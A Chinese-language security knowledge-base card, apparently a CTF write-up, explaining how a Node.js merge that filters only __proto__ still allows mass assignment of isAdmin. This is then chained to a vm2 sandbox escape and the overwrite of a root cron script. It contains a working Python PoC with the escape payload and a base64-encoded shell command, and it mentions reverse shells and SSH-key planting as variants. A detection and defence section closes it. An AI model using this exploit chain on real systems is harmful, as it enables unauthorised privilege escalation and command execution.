---
id: web-nodejs-merge-proto-filter-mass-assignment-isadmin
title: Node.js 递归 merge 过滤 __proto__ 仍可 mass assignment：/changepassword 注入 isAdmin 提权并链到 vm2 逃逸
type: scenario
domain: web
path: web/nodejs
technique: merge-proto-filter-mass-assignment-isadmin
tags:
- nodejs
- express
- mass-assignment
- prototype-pollution
- auth-bypass
- vm2
- sandbox-escape
- cron
- ctf
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V126
  verified_at: '2026-11-06T04:12:35+08:00'
  notes: 已对照原文与 3 张图核对：merge 显式跳过 __proto__、/changepassword 执行 merge(user,req.body) 导致 isAdmin 批量赋值、/sandbox 仅判断 user.isAdmin、vm2 PoC、写 /app/public 回显、覆盖 root 可写 /backup.sh（图01 显示 -rwxrwxrwx root root，图02 为备份脚本）均一致；图03 显示 flag 已取得。原文称其为原型链污染但代码实际是 mass assignment，卡片按实际代码描述正确。vm2 3.10.0 未在正文出现，与库内已核 CVE-2026-22709 卡一致。PoC 未本机复跑；原文未标注组件受影响版本。
url: /docs/web/nodejs/web-nodejs-merge-proto-filter-mass-assignment-isadmin/
draft: false
kb_aliases:
- merge 过滤 __proto__ 仍提权
- Node.js 批量赋值 isAdmin
- changepassword merge 注入
- vm2 沙箱逃逸链
- 静态目录回显
- backup.sh 覆盖
---

## 一句话结论

递归 `merge` 显式跳过 `__proto__` 只能挡住原型链污染，挡不住**批量赋值**：`/changepassword` 把整个 `req.body` 合并进当前 `user` 对象，攻击者提交 `isAdmin: true` 即可把普通账号改成管理员；随后 `/sandbox` 的 vm2（CVE-2026-22709）逃逸执行命令，把输出写入 `/app/public` 静态目录回显，最后覆盖 root 可写的 `/backup.sh` 读取 flag。

## 原理

- **过滤错了对象**：`merge(target, source)` 中 `if (key === '__proto__') continue;` 防的是 `Object.prototype` 污染；但 `/changepassword` 调用的是 `merge(user, req.body)`，`target` 是当前用户对象，`req.body` 里的任意业务字段都会被直接写入 `user`。
- **敏感字段未白名单**：`isAdmin` 不在过滤列表里；`merge` 之后虽然执行 `user.password = newPassword`，但 `user.isAdmin = true` 已经落库（内存对象）。`/admin` 与 `/sandbox` 只判断 `user.isAdmin === true`，因此提权成立。
- **旧密码校验不是障碍**：攻击者知道自己账号的旧密码，`oldPassword/newPassword/confirmPassword` 三者一致即可通过；`isAdmin` 是额外字段，不影响校验。
- **后续 vm2 逃逸**：`/sandbox` 用 `new VM({timeout:5000, sandbox:{__result}}) .run(code)` 执行用户代码；vm2 3.10.0 的 `globalPromise.prototype.then/catch` 未清洗回调，`Error.name = Symbol()` + `async () => error.stack` + `.catch(e => e.constructor.constructor(...))` 可拿到宿主 `Function`，再经 `process.mainModule.require('child_process')` 执行命令。
- **无回显的绕法**：`express.static('/static', public)` 暴露了 `/app/public`；把命令输出重定向到 `/app/public/1`，再请求 `/static/1` 读取。
- **root 定时脚本**：`ls -l /` 显示 `/backup.sh` 权限 `-rwxrwxrwx root root`，且内容是备份脚本，说明 root 会定期执行；把它覆盖为 `cat /flag > /app/public/flag`，等待 cron 后从静态目录取 flag。

## 触发条件

- 递归 merge 只过滤 `__proto__`/`constructor` 等原型键，没有业务字段白名单；merge 的 target 是用户/业务对象。
- 敏感字段（`isAdmin`、`role`、`balance` 等）在后续权限判断中被读取。
- 攻击者已登录并能控制 JSON 请求体。
- 后续存在 vm2 沙箱执行用户代码（本例 3.10.0 + CVE-2026-22709）；静态目录可写；root 定时脚本可写。

## 利用步骤

1. 注册并登录普通用户。
2. `POST /changepassword`，body 为 `{"oldPassword":"123456","newPassword":"123456","confirmPassword":"123456","isAdmin":true}`；`merge(user, req.body)` 把 `isAdmin` 写入当前用户。
3. `GET /me` 确认 `isAdmin: true`；`GET /admin` 返回管理员欢迎信息。
4. `POST /sandbox` 提交 vm2 逃逸 PoC，把命令输出写到 `/app/public/1`；`GET /static/1` 查看 `ls -l /` 等结果。
5. 确认 `/backup.sh` 为 root 所有且可写；用 base64 编码命令覆盖：`echo <base64> | base64 -d | sh`，内容为 `cat /flag > /app/public/flag`。
6. 等待 cron 执行后 `GET /static/flag` 读取 flag。

## PoC

```python
import requests

s = requests.session()
data = {"username": "BR", "password": "123456"}
s.post(URL + "/register", json=data)
s.post(URL + "/login", json=data)

s.post(URL + "/changepassword", json={
    "oldPassword": "123456", "newPassword": "123456",
    "confirmPassword": "123456", "isAdmin": True,
})

js = """
const error = new Error();
error.name = Symbol();
const f = async () => error.stack;
f().catch(e => {
  const Function = e.constructor.constructor;
  new Function("process.mainModule.require('child_process').execSync('echo ZWNobyAiY2F0IC9mbGFnID4gL2FwcC9wdWJsaWMvZmxhZyIgPiAvYmFja3VwLnNo | base64 -d | sh', {stdio:'inherit'})")();
});
"""
s.post(URL + "/sandbox", json={"code": js.strip()})
# 等待 cron 后 GET /static/flag
```

## 变体与关联

- **字段变体**：除 `isAdmin` 外，`role`、`permissions`、`balance`、`ownerId`、`verified` 等只要被 merge 且后续被读取，都可批量赋值。
- **merge 变体**：`Object.assign`、lodash `_.merge`/`_.set`、配置合并、表单解析器；有的实现过滤 `__proto__` 但漏 `constructor.prototype`（那是原型链污染，见关联卡）。
- **后续链变体**：vm2 逃逸后可写静态目录、写计划任务、写 SSH key；也可直接反弹 shell。root 脚本可写时也可用 SUID/反弹 shell，不必读 flag。
- **关联卡片**：[[web-nodejs-prototype-pollution-merge-json-parse]]（merge 原型链污染）、[[binary-pwn-sandbox-escape-vm2-global-promise-callback-cve-2026-22709]]（vm2 逃逸）、[[pentest-privilege-escalation-cron-writable-script]]（root cron 脚本可写）、[[web-java-framework-spring-requestbody-mass-assignment-privilege-escalation]]（Java mass assignment）。
- **边界**：若 merge 有字段白名单、`isAdmin` 由服务端强制覆盖、或权限判断改用独立角色表，提权不成立；若 vm2 已修复、静态目录不可写、`/backup.sh` 不可写，后续链断。

## 检测与防御

- **修复**：不要 `merge(user, req.body)`；用显式字段白名单（只取 `oldPassword/newPassword`）；敏感字段由服务端赋值；权限判断用独立角色表而非用户对象上的布尔字段。
- **沙箱**：升级 vm2 或改用独立进程/容器隔离；不要给沙箱宿主 `process.mainModule` 能力。
- **文件权限**：root 定时脚本及其目录设为 `root:root 0755/0700`，禁止 other/group 写；Web 静态目录与可执行/脚本目录分离，静态目录不可写。
- **检测信号**：`/changepassword`、注册、资料修改请求中出现 `isAdmin`/`role`/`permissions` 等字段；普通用户对象上 `isAdmin` 变为 true；沙箱内出现 `Error.name=Symbol`、`constructor.constructor`、`process.mainModule`；静态目录出现命令输出文件。
